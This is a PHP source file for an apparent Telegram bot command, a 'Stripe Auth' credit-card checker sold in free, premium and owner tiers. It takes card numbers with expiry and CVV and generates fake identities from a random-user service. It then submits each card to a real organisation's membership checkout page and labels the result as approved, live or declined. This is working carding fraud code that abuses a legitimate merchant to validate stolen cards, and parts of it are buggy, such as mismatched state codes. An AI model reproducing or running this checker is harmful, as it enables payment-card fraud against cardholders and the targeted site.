<?php
//=======RANK DETERMINE=============//
error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');
//=========RANK DETERMINE=========//
$gate = "𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 [𝘃𝟭]";
$currentDate = date('Y-m-d');
$rank = "FREE";
$expiryDate = "0";

$paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
$freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
$owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

if (in_array($userId, $owners)) {
    $rank = "OWNER";
    $expiryDate = "UNTIL DEAD";
} else {
    foreach ($paidUsers as $index => $line) {
        list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
        if ($userIdFromFile == $userId) {
            if ($userExpiryDate < $currentDate) {
                unset($paidUsers[$index]); //
                file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                $freeUsers[] = $userId; // add to free users list
                file_put_contents('Database/free.txt', implode("\n", $freeUsers));
            } else    $currentDate = date('Y-m-d');
            $rank = "FREE";
            $expiryDate = "0";

            $paidUsers = file('Database/Premium.txt', FILE_IGNORE_NEW_LINES);
            $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
            $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

            if (in_array($userId, $owners)) {
                $rank = "OWNER";
                $expiryDate = "UNTIL DEAD";
            } else {
                foreach ($paidUsers as $index => $line) {
                    list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
                    if ($userIdFromFile == $userId) {
                        if ($userExpiryDate < $currentDate) {
                            unset($paidUsers[$index]);
                            file_put_contents('Database/Premium.txt', implode("\n", $paidUsers));
                            $freeUsers[] = $userId;
                            file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                        } else {
                            $rank = "Premium";
                            $expiryDate = $userExpiryDate;
                        }
                    }
                }
            } {
                $rank = "Premium";
                $expiryDate = $userExpiryDate;
            }
        }
    }
}

//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];

//========WHO CAN CHECK===========//
if (preg_match('/^(\/au|\.au|!au)/', $text)) {
  


  

$start_time = microtime(true);
  
  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";


//=======WHO CAN CHECK END==========//
  
//=====ANTISPAM AND WRONG FORMAT====// 
  if (strlen($message) <= 4) {
            sendMessage($chatId, "<b>• 𝗪𝗿𝗼𝗻𝗴 𝗙𝗼𝗿𝗺𝗮𝘁! ⚠️</b>%0A• 𝘀𝗲𝗻𝗱 <code>/au cc|mm|yy|cvv</code>%0A• 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 >> $gate", $message_id);
            exit();
  }
//===ANTISPAM AND WRONG FORMAT END===//

  
  //=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 4);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>
   ↯ 🆁🅴🆅🅸🅴🆆🅸🅽🅶 🆈🅾🆄'🆁🅴 🆁🅴🆀🆄🅴🆂🆃 ↯
CC: <code>$lista</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: $gate
𝗦𝘁𝗮𝘁𝘂𝘀: <code>ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 𝟘%</code>
Req: <code>@$username</code>
</b>");
  
function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];



  
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
   ↯ 🆁🅴🆅🅸🅴🆆🅸🅽🅶 🆈🅾🆄'🆁🅴 🆁🅴🆀🆄🅴🆂🆃 ↯
CC: <code>$lista</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: $gate
𝗦𝘁𝗮𝘁𝘂𝘀: <code>ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 2𝟘%</code>
Req: <code>@$username</code>
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.4/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
   ↯ 🆁🅴🆅🅸🅴🆆🅸🅽🅶 🆈🅾🆄'🆁🅴 🆁🅴🆀🆄🅴🆂🆃 ↯
CC: <code>$lista</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: $gate
𝗦𝘁𝗮𝘁𝘂𝘀: <code>ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 5𝟘%</code>
Req: <code>@$username</code>
</b>");

  
  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));

  
//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
  ↯ 🆁🅴🆅🅸🅴🆆🅸🅽🅶 🆈🅾🆄'🆁🅴 🆁🅴🆀🆄🅴🆂🆃 ↯
CC: <code>$lista</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: $gate
𝗦𝘁𝗮𝘁𝘂𝘀: <code>ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 8𝟘%</code>
Req: <code>@$username</code>
</b>");  
//-------------------Req 2--------------//
 $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://1cda.org/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Origin: https://1cda.org';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Referer: https://1cda.org/membership-account/membership-checkout/';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&username='.$un.'&password='.$pass.'&password2='.$pass.'&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&how_heard_about_us=google&bfirstname='.$firstname.'&blastname='.$lastname.'&baddress1=11+'.$city.'+Bridge&baddress2=&bcity='.$city.'&bstate='.$state.'&bzipcode='.$postcode.'&bcountry=US&bphone='.$phone.'&CardType='.$card_type.'&AccountNumber='.$cc.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'&CVV='.$cvv.'&submit-checkout=1&javascriptok=1');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result2 = curl_exec($ch);

$msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));


sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>
   ↯ 🆁🅴🆅🅸🅴🆆🅸🅽🅶 🆈🅾🆄'🆁🅴 🆁🅴🆀🆄🅴🆂🆃 ↯
CC: <code>$lista</code>
𝗚𝗮𝘁𝗲𝘄𝗮𝘆: $gate
𝗦𝘁𝗮𝘁𝘂𝘀: <code>ℂ𝕙𝕖𝕔𝕜𝕚𝕟𝕘 𝟙𝟘𝟘% 🟩</code>
Req: <code>@$username</code>
</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);
  
  //======checker part end=========//


if ((strpos($result2, 'Thank you! For security reasons your order is currently being reviewed.')) || (strpos($result2, "Thank You.")) || (strpos($result2, 'Your card zip code is incorrect.')) || (strpos($result2, "Thank You For Donation.")) || (strpos($result2, "incorrect_zip")) || (strpos($result2, "Success ")) || (strpos($result2, '"type":"one-time"')) || (strpos($result2, "/donations/thank_you?donation_number="))){

  $resp = "<b>
 [火]𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 [𝘃𝟭] 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Auth Approved ✅
•└Response: <code>Approved</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$bininfo</code>
•├Type: <code>$scheme</code>
•├Country: <code>$country $emoji</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

$resp = "<b>
 [火]Stripe Auth [v1] 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Insufficient funds ✅
•└Response: <code>Insufficient Funds</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$country $emoji</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━


</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, 'security code is incorrect.')) {
$resp = "<b>
 [火]Stripe Auth [v1] 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: CCN Live ✅
•└Response: <code>security code is incorrect.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$country $emoji</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

else {
$resp = "<b>
 [火]Stripe Auth [v1] 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Declined ❌
•└Response: <code>$msg </code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$scheme</code>
•├Country: <code>$country $emoji</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}